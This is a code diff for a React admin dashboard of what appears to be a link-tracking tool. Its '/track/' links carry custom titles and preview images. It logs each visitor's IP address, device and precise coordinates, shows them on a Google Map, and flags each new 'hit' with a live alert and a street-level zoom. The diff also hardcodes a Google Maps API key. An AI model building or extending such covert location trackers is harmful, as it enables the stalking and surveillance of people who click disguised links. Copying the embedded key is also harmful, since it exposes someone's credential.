@@ -106,6 +106,9 @@ const AdminDashboard = () => {
     const [links, setLinks] = useState([]);
     const [sessions, setSessions] = useState([]);
     const [activeTab, setActiveTab] = useState('dashboard');
+    const [selectedSession, setSelectedSession] = useState(null);
+    const [editingLink, setEditingLink] = useState(null);
+    const [toast, setToast] = useState(null);
     const { isLoaded, loadError } = useLoadScript({
         googleMapsApiKey: 'AIzaSyA4qMbpLlGXpc3EOTqelCXEdmCQBYnJh9g',
     });
@@ -114,11 +117,13 @@ const AdminDashboard = () => {
 
     useEffect(() => {
         fetchAdminData();
-        const socket = io('http://localhost:3001');
+        const socket = io('/', { path: '/socket.io' });
         socketRef.current = socket;
         socket.on('connect', () => socket.emit('join-admin'));
         socket.on('location-updated', (session) => {
             setSessions(prev => [session, ...prev]);
+            setToast(session);
+            setTimeout(() => setToast(null), 10000); // 10s duration
         });
         return () => socket.disconnect();
     }, []);
@@ -127,11 +132,55 @@ const AdminDashboard = () => {
         try {
             const [linksRes, sessionsRes] = await Promise.all([
                 api.get('/admin/links'),
-                api.get('/user/sessions') // Using existing route or create admin specific
+                api.get('/user/sessions')
             ]);
             setLinks(linksRes.data);
             setSessions(sessionsRes.data);
         } catch (e) { console.error("Error fetching admin data", e); }
+    };
+
+    const handleLocate = (session) => {
+        setSelectedSession(session);
+        setActiveTab('dashboard');
+    };
+
+    const handleDeleteLink = async (id) => {
+        if (!window.confirm('¿Estás seguro de que quieres eliminar este enlace? Esta acción es irreversible.')) return;
+        try {
+            await api.delete(`/links/${id}`);
+            fetchAdminData();
+        } catch (e) {
+            alert('Error eliminando enlace: ' + (e.response?.data?.message || e.message));
+        }
+    };
+
+    const handleUpdateLink = async (e) => {
+        e.preventDefault();
+        try {
+            await api.put(`/links/${editingLink.id}`, editingLink);
+            setEditingLink(null);
+            fetchAdminData();
+        } catch (e) {
+            alert('Error actualizando enlace: ' + (e.response?.data?.message || e.message));
+        }
+    };
+
+    const parseUA = (ua) => {
+        if (!ua) return { os: '?', browser: '?' };
+        let os = 'Unknown';
+        if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone')) os = 'iOS';
+        else if (ua.includes('Macintosh')) os = 'Mac';
+        else if (ua.includes('Linux')) os = 'Linux';
+
+        let browser = 'Browser';
+        if (ua.includes('Chrome')) browser = 'Chrome';
+        else if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+        else if (ua.includes('Edge')) browser = 'Edge';
+
+        return { os, browser };
     };
 
     if (loadError) return <div>Error loading maps</div>;
@@ -218,6 +267,28 @@ const AdminDashboard = () => {
 
             {/* Main Content Area */}
             <main className="flex-1 flex flex-col relative overflow-hidden">
+                {toast && (
+                    <div className="fixed top-8 right-8 z-[101] animate-in slide-in-from-right-8 duration-300">
+                        <div className="bg-slate-900 border border-white/20 rounded-2xl shadow-2xl p-4 flex items-center gap-4 text-white max-w-sm">
+                            <div className="size-12 rounded-xl bg-primary/20 flex items-center justify-center">
+                                <span className="material-symbols-outlined text-primary animate-pulse">radar</span>
+                            </div>
+                            <div className="flex-1">
+                                <p className="text-sm font-bold text-white">Hit Global Detectado</p>
+                                <p className="text-[10px] text-slate-400 italic truncate">Nueva actividad en el sistema</p>
+                            </div>
+                            <button
+                                onClick={() => { handleLocate(toast); setToast(null); }}
+                                className="px-4 py-2 rounded-lg bg-primary text-white font-bold text-xs hover:bg-primary/90 transition-colors"
+                            >
+                                ABRIR MAPA
+                            </button>
+                            <button onClick={() => setToast(null)} className="p-1 hover:bg-white/10 rounded-full transition-colors text-slate-500">
+                                <span className="material-symbols-outlined text-sm">close</span>
+                            </button>
+                        </div>
+                    </div>
+                )}
                 {/* Content: Dashboard (Map + Stats) */}
                 {activeTab === 'dashboard' && (
                     <>
@@ -225,15 +296,16 @@ const AdminDashboard = () => {
                         <div className="absolute inset-0 z-0 bg-background-dark">
                             <GoogleMap
                                 mapContainerStyle={mapContainerStyle}
-                                zoom={2}
-                                center={center}
+                                zoom={selectedSession ? 15 : 2}
+                                center={selectedSession ? { lat: selectedSession.lat, lng: selectedSession.lng } : center}
                                 options={mapOptions}
                             >
                                 {sessions.map(s => (
                                     <Marker
-                                        key={s.socketId}
+                                        key={s.id || s.socketId}
                                         position={{ lat: s.lat, lng: s.lng }}
-                                        title={s.userAgent}
+                                        title={`${s.ip} - ${s.userAgent}`}
+                                        animation={selectedSession?.id === s.id && window.google ? window.google.maps.Animation.BOUNCE : null}
                                     />
                                 ))}
                             </GoogleMap>
@@ -290,25 +362,47 @@ const AdminDashboard = () => {
                                     <thead className="sticky top-0 bg-[#1a2634] z-10">
                                         <tr>
                                             <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Hora</th>
-                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider text-center">Navegador</th>
-                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Coordenadas</th>
-                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">ID Enlace</th>
+                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Dispositivo / Sistema</th>
+                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">IP / Red</th>
+                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Enlace</th>
+                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider text-right">Mapa</th>
                                         </tr>
                                     </thead>
                                     <tbody className="divide-y divide-white/5">
-                                        {sessions.map(s => (
-                                            <tr key={s.socketId} className="hover:bg-white/5 transition-colors group">
-                                                <td className="px-6 py-4 text-primary text-sm font-medium">{new Date(s.timestamp).toLocaleTimeString()}</td>
-                                                <td className="px-6 py-4 text-white text-sm font-mono truncate max-w-[200px]">{s.userAgent}</td>
-                                                <td className="px-6 py-4 text-slate-400 text-sm font-mono italic">{s.lat.toFixed(4)}, {s.lng.toFixed(4)}</td>
-                                                <td className="px-6 py-4">
-                                                    <span className="px-3 py-1 rounded-lg bg-primary/20 text-primary text-xs font-bold border border-primary/20">{s.linkId}</span>
-                                                </td>
-                                            </tr>
-                                        ))}
+                                        {sessions.map(s => {
+                                            const { os, browser } = parseUA(s.userAgent);
+                                            return (
+                                                <tr key={s.id || s.socketId} className="hover:bg-white/5 transition-colors group">
+                                                    <td className="px-6 py-4 text-primary text-sm font-medium">{new Date(s.timestamp).toLocaleTimeString()}</td>
+                                                    <td className="px-6 py-4">
+                                                        <div className="flex flex-col">
+                                                            <span className="text-white text-sm font-bold">{os}</span>
+                                                            <span className="text-slate-500 text-[10px] font-mono">{browser}</span>
+                                                        </div>
+                                                    </td>
+                                                    <td className="px-6 py-4">
+                                                        <div className="flex flex-col">
+                                                            <span className="text-slate-300 text-sm font-mono">{s.ip || '0.0.0.0'}</span>
+                                                            <span className="text-slate-500 text-[10px] italic">{s.lat.toFixed(4)}, {s.lng.toFixed(4)}</span>
+                                                        </div>
+                                                    </td>
+                                                    <td className="px-6 py-4">
+                                                        <span className="px-3 py-1 rounded-lg bg-primary/20 text-primary text-xs font-bold border border-primary/20">{s.linkId}</span>
+                                                    </td>
+                                                    <td className="px-6 py-4 text-right">
+                                                        <button
+                                                            onClick={() => handleLocate(s)}
+                                                            className="p-2 bg-primary/10 text-primary rounded-lg hover:bg-primary/20 transition-all"
+                                                        >
+                                                            <span className="material-symbols-outlined text-[20px]">map_go</span>
+                                                        </button>
+                                                    </td>
+                                                </tr>
+                                            );
+                                        })}
                                         {sessions.length === 0 && (
                                             <tr>
-                                                <td colSpan="4" className="px-6 py-4 text-center text-slate-500">Esperando conexiones...</td>
+                                                <td colSpan="5" className="px-6 py-4 text-center text-slate-500">Esperando conexiones...</td>
                                             </tr>
                                         )}
                                     </tbody>
@@ -365,12 +459,11 @@ const AdminDashboard = () => {
                                                 <span className="text-sm text-primary hover:underline truncate max-w-[150px] block cursor-pointer">{link.destinationUrl}</span>
                                             </td>
                                             <td className="px-6 py-4 text-right">
-                                                <button
-                                                    onClick={() => navigator.clipboard.writeText(`${window.location.origin}/track/${link.id}`)}
-                                                    className="px-3 py-1.5 rounded-lg bg-primary/10 text-primary text-xs font-black border border-primary/20 hover:bg-primary/20 transition-all"
-                                                >
-                                                    COPIAR
-                                                </button>
+                                                <div className="flex justify-end gap-1">
+                                                    <button onClick={() => navigator.clipboard.writeText(`${window.location.origin}/track/${link.id}`)} className="p-2 text-primary hover:bg-primary/10 rounded-lg transition-colors"><span className="material-symbols-outlined text-[20px]">content_copy</span></button>
+                                                    <button onClick={() => setEditingLink({ ...link })} className="p-2 text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 rounded-lg transition-colors"><span className="material-symbols-outlined text-[20px]">edit</span></button>
+                                                    <button onClick={() => handleDeleteLink(link.id)} className="p-2 text-red-500 hover:bg-red-50 dark:hover:bg-red-900/10 rounded-lg transition-colors"><span className="material-symbols-outlined text-[20px]">delete</span></button>
+                                                </div>
                                             </td>
                                         </tr>
                                     ))}
@@ -385,6 +478,35 @@ const AdminDashboard = () => {
                     </div>
                 )}
             </main>
+
+            {editingLink && (
+                <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
+                    <div className="bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-2xl w-full max-w-lg overflow-hidden scale-in-center">
+                        <div className="px-6 py-4 border-b border-slate-100 dark:border-slate-800 flex items-center justify-between">
+                            <h3 className="text-lg font-bold dark:text-white">Editar Enlace (Admin)</h3>
+                            <button onClick={() => setEditingLink(null)} className="p-2 hover:bg-slate-100 rounded-full text-slate-500"><span className="material-symbols-outlined">close</span></button>
+                        </div>
+                        <form onSubmit={handleUpdateLink} className="p-6 flex flex-col gap-4">
+                            <div className="flex flex-col gap-1.5">
+                                <label className="text-xs font-bold text-slate-500 uppercase">Título</label>
+                                <input type="text" value={editingLink.title} onChange={(e) => setEditingLink({ ...editingLink, title: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm outline-none focus:ring-2 focus:ring-primary/20" />
+                            </div>
+                            <div className="flex flex-col gap-1.5">
+                                <label className="text-xs font-bold text-slate-500 uppercase">URL de Destino</label>
+                                <input type="url" value={editingLink.destinationUrl} onChange={(e) => setEditingLink({ ...editingLink, destinationUrl: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm outline-none focus:ring-2 focus:ring-primary/20" />
+                            </div>
+                            <div className="flex flex-col gap-1.5">
+                                <label className="text-xs font-bold text-slate-500 uppercase">URL Imagen</label>
+                                <input type="text" value={editingLink.imageUrl || ''} onChange={(e) => setEditingLink({ ...editingLink, imageUrl: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm outline-none focus:ring-2 focus:ring-primary/20" />
+                            </div>
+                            <div className="flex gap-3 mt-2">
+                                <button type="button" onClick={() => setEditingLink(null)} className="flex-1 h-12 rounded-xl border border-slate-200 dark:border-slate-800 text-sm font-bold text-slate-600 dark:text-slate-300">Cancelar</button>
+                                <button type="submit" className="flex-1 h-12 rounded-xl bg-primary text-white text-sm font-bold shadow-lg shadow-primary/25">Guardar</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            )}
         </div>
     );
 };
